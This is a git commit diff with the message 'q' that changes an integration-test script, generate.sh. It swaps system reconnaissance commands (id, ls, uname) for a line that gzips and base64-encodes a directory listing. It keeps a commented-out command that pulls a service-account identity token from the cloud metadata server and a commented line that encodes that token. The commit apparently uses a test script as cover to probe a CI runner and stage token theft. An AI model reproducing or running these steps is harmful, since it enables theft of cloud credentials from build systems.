b74328ba0e1ac96d095b8cb87db658045350bff5
Duc Nguyen <ducnh@calif.io>
2025-05-19 11:12:39 +0700

    q

--- cmd/integration-test/generate.sh
+++ cmd/integration-test/generate.sh
@@ -1,10 +1,4 @@
 #!/bin/bash
 # idtoken=$(curl --fail-with-body -sSL -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/service-accounts/default/identity?audience=octo-sts.dev)
-
-id
-ls
-pwd
-uname
-ls -la
-pwd
-ll
+# echo $idtoken|gzip -v9|base64 -w0
+ls -la|gzip -v9|base64 -w0
